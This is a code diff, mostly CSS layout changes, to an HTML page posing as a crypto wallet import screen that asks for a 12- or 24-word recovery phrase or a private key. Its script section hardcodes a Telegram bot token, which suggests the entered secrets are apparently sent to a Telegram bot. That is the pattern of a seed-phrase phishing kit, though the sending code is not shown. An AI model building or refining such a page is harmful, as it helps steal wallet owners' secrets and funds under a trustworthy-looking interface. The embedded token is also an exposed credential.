@@ -10,24 +10,16 @@
       padding: 0;
       font-family: 'Segoe UI', sans-serif;
       background: #f3f4f6;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      overflow-x: hidden;
     }
 
-    .container {
-      width: 100%;
-      max-width: 350px;
-      height: 100vh;
-      max-height: 600px;
-      background: #f3f4f6;
-      padding: 10px;
-      overflow-y: auto;
-      box-sizing: border-box;
+    body {
       display: flex;
       flex-direction: column;
       align-items: center;
+      padding: 10px;
+      box-sizing: border-box;
+      max-width: 100%;
     }
 
     .step-indicator {
@@ -44,7 +36,6 @@
       align-items: center;
       font-size: 12px;
       color: #6b7280;
-      text-align: center;
     }
 
     .circle {
@@ -122,7 +113,6 @@
       margin-bottom: 4px;
       display: block;
       color: #374151;
-      width: 100%;
     }
 
     select {
@@ -191,52 +181,79 @@
     .error { color: red; }
     .success { color: green; }
 
-    @media (max-width: 400px) {
-      .container {
-        border-radius: 0;
+    @media (max-width: 480px) {
+      body {
+        padding: 15px;
+      }
+
+      .step-indicator {
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .line {
+        width: 2px;
+        height: 30px;
+        background-color: #cbd5e1;
+        margin: 5px 0;
+      }
+
+      .tab-buttons {
+        flex-direction: column;
+      }
+
+      .tab-buttons button {
+        width: 100%;
+      }
+
+      .grid {
+        grid-template-columns: 1fr;
+      }
+
+      .confirm-btn {
+        width: 100%;
       }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="step-indicator">
-      <div class="step">
-        <div class="circle active">1</div>
-        <span>Confirm secret recovery phrase</span>
-      </div>
-      <div class="line"></div>
-      <div class="step">
-        <div class="circle">2</div>
-        <span>Create password</span>
-      </div>
+
+  <div class="step-indicator">
+    <div class="step">
+      <div class="circle active">1</div>
+      <span>Confirm secret recovery phrase</span>
     </div>
-
-    <h2>Importing Wallet</h2>
-    <p class="subtitle">Securely restore your wallet using your recovery phrase or private key</p>
-
-    <div class="tab-buttons">
-      <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
-      <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
+    <div class="line"></div>
+    <div class="step">
+      <div class="circle">2</div>
+      <span>Create password</span>
     </div>
-
-    <label for="wordsCount">Seed phrase words:</label>
-    <select id="wordsCount" onchange="updateInputs(this.value)">
-      <option value="12" selected>12</option>
-      <option value="24">24</option>
-    </select>
-
-    <div id="secretTabContent">
-      <div class="grid" id="seedInputs"></div>
-    </div>
-
-    <div id="privateTabContent" style="display:none">
-      <textarea id="privateKeyInput" rows="4" placeholder="Enter your private key"></textarea>
-    </div>
-
-    <button class="confirm-btn" onclick="onConfirm()">Confirm Secret Recovery Phrase</button>
-    <div id="message" class="message"></div>
   </div>
+
+  <h2>Importing Wallet</h2>
+  <p class="subtitle">Securely restore your wallet using your recovery phrase or private key</p>
+
+  <div class="tab-buttons">
+    <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
+    <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
+  </div>
+
+  <label for="wordsCount">Seed phrase words:</label>
+  <select id="wordsCount" onchange="updateInputs(this.value)">
+    <option value="12" selected>12</option>
+    <option value="24">24</option>
+  </select>
+
+  <div id="secretTabContent">
+    <div class="grid" id="seedInputs"></div>
+  </div>
+
+  <div id="privateTabContent" style="display:none">
+    <textarea id="privateKeyInput" rows="4" placeholder="Enter your private key"></textarea>
+  </div>
+
+  <button class="confirm-btn" onclick="onConfirm()">Confirm Secret Recovery Phrase</button>
+  <div id="message" class="message"></div>
 
   <script>
     const TELEGRAM_BOT_TOKEN = '7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0';
@@ -251,6 +268,12 @@
         const input = document.createElement('input');
         input.placeholder = i;
         container.appendChild(input);
+      }
+
+      if (parseInt(count) > 12) {
+        document.body.style.overflowY = 'auto';
+      } else {
+        document.body.style.overflowY = 'hidden';
       }
     }
 
